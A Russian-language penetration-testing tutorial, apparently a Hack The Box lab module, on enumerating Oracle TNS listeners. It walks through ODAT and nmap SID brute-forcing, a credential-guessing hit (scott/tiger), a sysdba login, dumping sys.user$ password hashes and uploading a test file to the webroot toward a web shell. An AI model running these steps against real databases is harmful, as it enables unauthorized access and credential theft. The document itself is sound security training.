
---

Сервер `Oracle Transparent Network Substrate`( `TNS`) — это протокол связи, обеспечивающий обмен данными между базами данных Oracle и приложениями по сети. Первоначально представленный как часть программного пакета [Oracle Net Services](https://docs.oracle.com/en/database/oracle/oracle-database/18/netag/introducing-oracle-net-services.html) , TNS поддерживает различные сетевые протоколы между базами данных Oracle и клиентскими приложениями, такие как стеки протоколов `IPX/SPX`и `TCP/IP`. В результате он стал предпочтительным решением для управления большими и сложными базами данных в здравоохранении, финансах и розничной торговле. Кроме того, его встроенный механизм шифрования обеспечивает безопасность передаваемых данных, что делает его идеальным решением для корпоративных сред, где безопасность данных имеет первостепенное значение.

Со временем TNS был обновлен для поддержки новых технологий, включая `IPv6`шифрование `SSL/TLS`, что делает его более подходящим для следующих целей:

|||||
|---|---|---|---|
|Разрешение имен|Управление соединениями|Балансировка нагрузки|Безопасность|

Кроме того, он обеспечивает шифрование связи между клиентом и сервером за счет дополнительного уровня безопасности поверх протокола TCP/IP. Эта функция помогает защитить архитектуру базы данных от несанкционированного доступа или атак, направленных на компрометацию данных в сетевом трафике. Помимо этого, он предоставляет расширенные инструменты и возможности для администраторов и разработчиков баз данных, предлагая комплексные инструменты мониторинга и анализа производительности, возможности отчетности и регистрации ошибок, управление рабочей нагрузкой и отказоустойчивость через службы базы данных.

---

## Конфигурация по умолчанию

Конфигурация сервера Oracle TNS по умолчанию зависит от версии и редакции установленного программного обеспечения Oracle. Однако некоторые общие параметры обычно настраиваются по умолчанию в Oracle TNS. По умолчанию прослушиватель ожидает входящие соединения на порту `TCP/1521`. Однако этот порт по умолчанию можно изменить во время установки или позже в файле конфигурации. Прослушиватель TNS настроен на поддержку различных сетевых протоколов, включая `TCP/IP`, `UDP`, `IPX/SPX`, и `AppleTalk`. Прослушиватель также может поддерживать несколько сетевых интерфейсов и прослушивать определенные IP-адреса или все доступные сетевые интерфейсы. По умолчанию Oracle TNS можно удаленно управлять в `Oracle 8i`/, `9i`но не в Oracle 10g/11g.

Конфигурация по умолчанию для прослушивателя TNS также включает несколько базовых функций безопасности. Например, прослушиватель будет принимать соединения только от авторизованных хостов и выполнять базовую аутентификацию, используя комбинацию имен хостов, IP-адресов, а также имен пользователей и паролей. Кроме того, прослушиватель будет использовать Oracle Net Services для шифрования связи между клиентом и сервером. Файлы конфигурации для Oracle TNS называются `tnsnames.ora`и `listener.ora`и обычно находятся в `$ORACLE_HOME/network/admin`каталоге. Текстовый файл содержит информацию о конфигурации экземпляров баз данных Oracle и других сетевых служб, использующих протокол TNS.

Oracle TNS часто используется с другими сервисами Oracle, такими как Oracle DBSNMP, базы данных Oracle, сервер приложений Oracle, Oracle Enterprise Manager, Oracle Fusion Middleware, веб-серверы и многие другие. В стандартную установку сервисов Oracle были внесены многочисленные изменения. Например, в Oracle 9 используется пароль по умолчанию, `CHANGE_ON_INSTALL`тогда как в Oracle 10 пароль по умолчанию не установлен. Сервис Oracle DBSNMP также использует пароль по умолчанию, `dbsnmp`который следует запомнить. Другой пример: многие организации до сих пор используют этот `finger`сервис совместно с Oracle, что может поставить под угрозу работу сервиса Oracle и сделать его уязвимым, если у нас есть необходимые данные о домашнем каталоге.

Каждая база данных или служба имеет уникальную запись в файле [tnsnames.ora](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm#NETRF007) , содержащую необходимую информацию для подключения клиентов к службе. Запись включает в себя имя службы, сетевое расположение службы и имя базы данных или службы, которое клиенты должны использовать при подключении к службе. Например, простой `tnsnames.ora`файл может выглядеть так:

#### Tnsnames.ora

        текст
`ORCL =   (DESCRIPTION =    (ADDRESS_LIST =      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))    )    (CONNECT_DATA =      (SERVER = DEDICATED)      (SERVICE_NAME = orcl)    )  )`

Здесь мы видим службу с именем `ORCL`, которая прослушивает порт `TCP/1521`по IP-адресу `10.129.11.102`. Клиенты должны использовать имя службы `orcl`при подключении к ней. Однако файл tnsnames.ora может содержать множество подобных записей для различных баз данных и служб. Записи также могут включать дополнительную информацию, такую ​​как данные аутентификации, настройки пула соединений и конфигурации балансировки нагрузки.

С другой стороны, этот `listener.ora`файл представляет собой конфигурационный файл на стороне сервера, определяющий свойства и параметры процесса прослушивания, который отвечает за прием входящих запросов от клиентов и их переадресацию соответствующему экземпляру базы данных Oracle.

#### Listener.ora

        текст
`SID_LIST_LISTENER =   (SID_LIST =    (SID_DESC =      (SID_NAME = PDB1)      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)      (GLOBAL_DBNAME = PDB1)      (SID_DIRECTORY_LIST =        (SID_DIRECTORY =          (DIRECTORY_TYPE = TNS_ADMIN)          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)        )      )    )  ) LISTENER =   (DESCRIPTION_LIST =    (DESCRIPTION =      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))    )  ) ADR_BASE_LISTENER = C:\oracle`

Вкратце, клиентское программное обеспечение Oracle Net Services использует этот `tnsnames.ora`файл для преобразования имен служб в сетевые адреса, а процесс-слушатель использует этот `listener.ora`файл для определения служб, которые он должен прослушивать, и поведения самого слушателя.

Базы данных Oracle можно защитить с помощью так называемого списка исключений PL/SQL (PL/SQL Exclusion List `PlsqlExclusionList`). Это создаваемый пользователем текстовый файл, который необходимо разместить в соответствующем `$ORACLE_HOME/sqldeveloper`каталоге. Он содержит имена пакетов или типов PL/SQL, которые следует исключить из выполнения. После создания файла списка исключений PL/SQL его можно загрузить в экземпляр базы данных. Он служит черным списком, к которому нельзя получить доступ через сервер приложений Oracle.

|**Параметр**|**Описание**|
|---|---|
|`DESCRIPTION`|Дескриптор, указывающий имя базы данных и тип подключения к ней.|
|`ADDRESS`|Сетевой адрес базы данных, включающий имя хоста и номер порта.|
|`PROTOCOL`|Сетевой протокол, используемый для связи с сервером.|
|`PORT`|Номер порта, используемый для связи с сервером.|
|`CONNECT_DATA`|Указывает атрибуты соединения, такие как имя службы или SID, протокол и идентификатор экземпляра базы данных.|
|`INSTANCE_NAME`|Имя экземпляра базы данных, к которому клиент хочет подключиться.|
|`SERVICE_NAME`|Название сервиса, к которому клиент хочет подключиться.|
|`SERVER`|Тип сервера, используемого для подключения к базе данных, например, выделенный или общий.|
|`USER`|Имя пользователя, используемое для аутентификации на сервере базы данных.|
|`PASSWORD`|Пароль, используемый для аутентификации на сервере базы данных.|
|`SECURITY`|Тип защиты соединения.|
|`VALIDATE_CERT`|Следует ли проверять сертификат с использованием SSL/TLS.|
|`SSL_VERSION`|Версия SSL/TLS, используемая для подключения.|
|`CONNECT_TIMEOUT`|Ограничение по времени в секундах, необходимое клиенту для установления соединения с базой данных.|
|`RECEIVE_TIMEOUT`|Ограничение по времени в секундах, необходимое клиенту для получения ответа от базы данных.|
|`SEND_TIMEOUT`|Ограничение по времени в секундах, установленное для отправки клиентом запроса к базе данных.|
|`SQLNET.EXPIRE_TIME`|Истекло время в секундах, отведенное клиенту для обнаружения соединения.|
|`TRACE_LEVEL`|Уровень трассировки для подключения к базе данных.|
|`TRACE_DIRECTORY`|Каталог, где хранятся файлы трассировки.|
|`TRACE_FILE_NAME`|Название файла трассировки.|
|`LOG_FILE`|Файл, в котором хранится информация журнала.|

Прежде чем мы сможем перечислить TNS-слушатель и взаимодействовать с ним, нам необходимо загрузить несколько пакетов и инструментов для нашего `Pwnbox`экземпляра, если они еще отсутствуют. Вот список команд, которые выполняют все эти действия:

#### Настройка

        shellsession
`MuraMitchi@htb[/htb]$ wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip sudo mkdir -p /opt/oracle sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH export PATH=$LD_LIBRARY_PATH:$PATH source ~/.bashrc cd ~ git clone https://github.com/quentinhardy/odat.git cd odat/ pip install python-libnmap git submodule init git submodule update pip3 install cx_Oracle sudo apt-get install python3-scapy -y sudo pip3 install colorlog termcolor passlib python-libnmap sudo apt-get install build-essential libgmp-dev -y pip3 install pycryptodome --2025-06-24 00:24:53--  https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip Resolving download.oracle.com (download.oracle.com)... 23.58.104.121 Connecting to download.oracle.com (download.oracle.com)|23.58.104.121|:443... connected. HTTP request sent, awaiting response... 200 OK Length: 79386308 (76M) [application/zip] Saving to: ‘instantclient-basic-linux.x64-21.4.0.0.0dbru.zip’ <SNIP>`

После этого мы можем попытаться определить, была ли установка успешной, выполнив следующую команду:

#### Тестирование ODAT

        shellsession
`MuraMitchi@htb[/htb]$ ./odat.py -h usage: odat.py [-h] [--version]                {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}               ...             _  __   _  ___           / \|  \ / \|_ _|          ( o ) o ) o || |           \_/|__/|_n_||_|  -------------------------------------------   _        __           _           ___ / \      |  \         / \         |_ _| ( o )       o )         o |         | |   \_/racle |__/atabase |_n_|ttacking |_|ool  ------------------------------------------- By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com) ...SNIP...`

Oracle Database Attacking Tool ( `ODAT`) — это инструмент для тестирования на проникновение с открытым исходным кодом, написанный на Python и предназначенный для выявления и эксплуатации уязвимостей в базах данных Oracle. Он может использоваться для обнаружения и эксплуатации различных недостатков безопасности в базах данных Oracle, включая SQL-инъекции, удаленное выполнение кода и повышение привилегий.

Теперь давайте воспользуемся этим методом `nmap`для сканирования порта прослушивания Oracle TNS по умолчанию.

#### Nmap

        shellsession
`MuraMitchi@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST Nmap scan report for 10.129.204.235 Host is up (0.0041s latency). PORT     STATE SERVICE    VERSION 1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds`

Мы видим, что порт открыт, и служба запущена. В СУБД Oracle системный идентификатор (SID `SID`) — это уникальное имя, идентифицирующее конкретный экземпляр базы данных. Он может иметь несколько экземпляров, каждый со своим собственным системным идентификатором. Экземпляр представляет собой набор процессов и структур памяти, которые взаимодействуют для управления данными базы данных. Когда клиент подключается к базе данных Oracle, он указывает SID базы данных `SID`вместе со строкой подключения. Клиент использует этот SID для идентификации того, к какому экземпляру базы данных он хочет подключиться. Предположим, клиент не указывает SID. Тогда `tnsnames.ora`используется значение по умолчанию, определенное в файле.

Идентификаторы безопасности (SID) являются важной частью процесса подключения, поскольку они идентифицируют конкретный экземпляр базы данных, к которому клиент хочет подключиться. Если клиент укажет неверный SID, попытка подключения завершится неудачей. Администраторы баз данных могут использовать SID для мониторинга и управления отдельными экземплярами базы данных. Например, они могут запускать, останавливать или перезапускать экземпляр, настраивать выделение памяти или другие параметры конфигурации, а также отслеживать его производительность с помощью таких инструментов, как Oracle Enterprise Manager.

Существует множество способов перечисления, или, точнее, угадывания SID. Поэтому мы можем использовать такие инструменты, как `nmap`, `hydra`, `odat`, и другие. Давайте `nmap`сначала воспользуемся ими.

#### Nmap - SID Bruteforcing

        shellsession
`MuraMitchi@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST Nmap scan report for 10.129.204.235 Host is up (0.0044s latency). PORT     STATE SERVICE    VERSION 1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized) | oracle-sid-brute:  |_  XE Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds`

С помощью этого инструмента мы можем `odat.py`выполнять различные сканирования для перечисления и сбора информации о службах базы данных Oracle и ее компонентах. Эти сканирования могут извлекать имена баз данных, версии, запущенные процессы, учетные записи пользователей, уязвимости, неправильные конфигурации и т. д. Давайте воспользуемся этой `all`опцией и попробуем все модули инструмента `odat.py`.

#### ОДАТ

        shellsession
`MuraMitchi@htb[/htb]$ ./odat.py all -s 10.129.204.235 [+] Checking if target 10.129.204.235:1521 is well configured for a connection... [+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue... ...SNIP... [!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16  [!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05  [!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59 [+] Valid credentials found: scott/tiger. Continue... ...SNIP...`

В этом примере мы нашли действительные учетные данные пользователя `scott`и его пароль `tiger`. После этого мы можем использовать инструмент `sqlplus`для подключения к базе данных Oracle и взаимодействия с ней.

#### SQLplus - Вход

        shellsession
`MuraMitchi@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023 Version 21.4.0.0.0 Copyright (c) 1982, 2021, Oracle. All rights reserved. ERROR: ORA-28002: the password will expire within 7 days Connected to: Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production SQL>`

Если вы столкнулись со следующей ошибкой `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, пожалуйста, выполните следующие действия, взятые [отсюда](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared) .

        shellsession
`MuraMitchi@htb[/htb]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig`

Существует множество [команд SQLplus](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985) , которые можно использовать для ручного перечисления данных в базе данных. Например, можно вывести список всех доступных таблиц в текущей базе данных или показать права доступа текущего пользователя следующим образом:

#### Взаимодействие с СУБД Oracle

        shellsession
`SQL> select table_name from all_tables; TABLE_NAME ------------------------------ DUAL SYSTEM_PRIVILEGE_MAP TABLE_PRIVILEGE_MAP STMT_AUDIT_OPTION_MAP AUDIT_ACTIONS WRR$_REPLAY_CALL_FILTER HS_BULKLOAD_VIEW_OBJ HS$_PARALLEL_METADATA HS_PARTITION_COL_NAME HS_PARTITION_COL_TYPE HELP ...SNIP... SQL> select * from user_role_privs; USERNAME                       GRANTED_ROLE                   ADM DEF OS_ ------------------------------ ------------------------------ --- --- --- SCOTT                          CONNECT                        NO  YES NO SCOTT                          RESOURCE                       NO  YES NO`

В данном случае у пользователя `scott`нет административных привилегий. Однако мы можем попробовать войти в систему под учетной записью системного администратора базы данных (System Database Admin `sysdba`), что предоставит нам более высокие привилегии. Это возможно, если у пользователя `scott`есть соответствующие привилегии, обычно предоставляемые администратором базы данных или используемые самим администратором.

#### Oracle RDBMS - перечисление баз данных

        shellsession
`MuraMitchi@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023 Version 21.4.0.0.0 Copyright (c) 1982, 2021, Oracle. All rights reserved. Connected to: Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production SQL> select * from user_role_privs; USERNAME                       GRANTED_ROLE                   ADM DEF OS_ ------------------------------ ------------------------------ --- --- --- SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO SYS                            AQ_USER_ROLE                   YES YES NO SYS                            AUTHENTICATEDUSER              YES YES NO SYS                            CONNECT                        YES YES NO SYS                            CTXAPP                         YES YES NO SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO SYS                            DBA                            YES YES NO SYS                            DBFS_ROLE                      YES YES NO USERNAME                       GRANTED_ROLE                   ADM DEF OS_ ------------------------------ ------------------------------ --- --- --- SYS                            DELETE_CATALOG_ROLE            YES YES NO SYS                            EXECUTE_CATALOG_ROLE           YES YES NO ...SNIP...`

Получив доступ к базе данных Oracle, мы можем использовать множество подходов. Выбор во многом зависит от имеющейся у нас информации и общей конфигурации системы. Однако мы не можем добавлять новых пользователей или вносить какие-либо изменения. В этом случае мы можем получить хэши паролей `sys.user$`и попытаться взломать их в автономном режиме. Запрос для этого будет выглядеть следующим образом:

#### СУБД Oracle — Извлечение хэшей паролей

        shellsession
`SQL> select name, password from sys.user$; NAME                           PASSWORD ------------------------------ ------------------------------ SYS                            FBA343E7D6C8BC9D PUBLIC CONNECT RESOURCE DBA SYSTEM                         B5073FE1DE351687 SELECT_CATALOG_ROLE EXECUTE_CATALOG_ROLE DELETE_CATALOG_ROLE OUTLN                          4A3BA55E08595C81 EXP_FULL_DATABASE NAME                           PASSWORD ------------------------------ ------------------------------ IMP_FULL_DATABASE LOGSTDBY_ADMINISTRATOR ...SNIP...`

Другой вариант — загрузить веб-оболочку на целевой сервер. Однако для этого требуется, чтобы на сервере работал веб-сервер, и нам нужно знать точное местоположение корневого каталога веб-сервера. Тем не менее, если мы знаем, с какой системой имеем дело, мы можем попробовать пути по умолчанию, которые следующие:

|**ТЫ**|**Путь**|
|---|---|
|Linux|`/var/www/html`|
|Windows|`C:\inetpub\wwwroot`|

Во-первых, всегда важно попробовать наш подход к эксплуатации с файлами, которые не выглядят опасными для антивирусных программ или систем обнаружения/предотвращения вторжений. Поэтому мы создаём текстовый файл со строкой и используем его для загрузки в целевую систему.

#### СУБД Oracle - Загрузка файла

        shellsession
`MuraMitchi@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt MuraMitchi@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt [1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                   [+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file`

Наконец, мы можем проверить, сработал ли способ загрузки файла `curl`. Для этого мы воспользуемся `GET http://<IP>`запросом или посетим сайт через браузер.

        shellsession
`MuraMitchi@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt Oracle File Upload Test`